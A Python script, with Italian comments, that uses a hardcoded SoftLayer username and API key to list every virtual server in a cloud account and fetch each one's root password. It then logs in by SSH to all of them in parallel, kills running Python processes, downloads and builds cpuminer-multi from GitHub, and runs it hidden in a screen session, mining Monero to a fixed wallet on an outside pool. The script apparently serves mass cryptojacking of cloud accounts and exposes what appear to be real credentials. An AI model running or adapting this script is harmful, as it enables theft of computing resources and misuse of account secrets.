###########################
##  BY ER MEJO (Namoso)  ##
###########################

import json, requests, paramiko, time
from threading import Thread


class sl:
	def __init__(self, username, api_key):
		self.username = username
		self.api_key = api_key
		self.address = '454ykJTkeV4XSGSE6ku6C2NBGhRMHhuMJNhoa4T1KdrV6KqReyzxxw14YgYx4jNhgCEDhnEZsNpMT18ywvLJ99tEHcCsGyT' # Mettete il vostro address
		self.base_url = f"https://{self.username}:{self.api_key}@api.softlayer.com/rest/v3/"

	def json_encode(self, res):
		data_json = json.loads(res.text)
		return data_json

	def create_ssh(self):
		ssh = paramiko.SSHClient()
		ssh.load_system_host_keys()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		return ssh

	## Ritorna gli id e ip delle vps come array ##
	def get_vps(self):
		query_string = "SoftLayer_Account/getVirtualGuests?objectFilter={}&objectMask=mask[id, primaryIpAddress]"
		res = requests.get(self.base_url+query_string)
		vps = []
		for v in self.json_encode(res):
			vps.append([v['id'], v['primaryIpAddress']])
		return vps

	## Ritorna la password dall'id della vps ##
	def get_pwd_vps(self, vps_id):
		query_string = f"SoftLayer_Virtual_Guest/{vps_id}/getSoftwareComponents?objectMask=mask[passwords]"
		res = requests.get(self.base_url+query_string)
		try:
			pwd = self.json_encode(res)[0]["passwords"][0]["password"]
		except:
			return 
		return pwd

	## Carica file locale nella vps ##
	def run_bash(self, ip, pwd):	
		ssh = self.create_ssh()
		ssh.connect(ip, port=22, username='root', password=pwd)
		stdin, stdout, stderr = ssh.exec_command('pkill python; echo y | apt-get update; echo y | sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev autotools-dev htop automake; git clone https://github.com/hyc/cpuminer-multi; cd cpuminer-multi; ./autogen.sh; CFLAGS="-march=native" ./configure; make;')
		print(stdout.readlines())
		stdin, stdout, stderr = ssh.exec_command(f'screen -d -m ./cpuminer-multi/minerd -a cryptonight -o stratum+tcp://pool.minexmr.com:4444 -u {self.address} -p x -B')
		print(stdout.readlines())
		ssh.close()


# Mettete qui il vostro id softlayer e la vostra apikey
sl = sl("SL1542073", "a14e8e6acdc8a8c5c3eba341ea08b07ef311327c3ccdf74062e7b810c1b0f6ba")
lista_id = sl.get_vps()
threads = []
for vps_id, ip in lista_id:
	pwd = sl.get_pwd_vps(vps_id)
	print(f"Start thread with {ip}:{pwd}")
	t = Thread(target=sl.run_bash, args=(ip, pwd))
	threads.append(t)
	#sl.run_bash(ip, pwd)
for t in threads:
	t.start()
for t in threads:
	t.join()

print("[!] Finished :)")



